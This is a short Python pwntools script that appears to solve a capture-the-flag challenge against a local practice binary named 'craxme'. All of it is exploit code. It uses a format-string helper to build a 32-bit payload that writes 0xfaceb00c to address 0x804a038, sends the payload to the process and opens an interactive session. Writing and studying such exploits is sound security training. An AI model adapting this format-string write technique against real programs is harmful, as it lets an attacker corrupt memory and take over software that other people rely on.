#!/usr/bin/env python

from pwn import *
from fmtexp import FmtStrExp

r = process('./sample/craxme')

# Address setup
adr = 0x804a038
password = 0xfaceb00c

# FormatString object setup and generate payload
fmt = FmtStrExp(printed=0, hij_tar=adr, hij_val=password)
fmt = [(fmt, 4)]
payload = FmtStrExp.generate32(fmt, 7)

r.sendline(payload)

r.interactive()
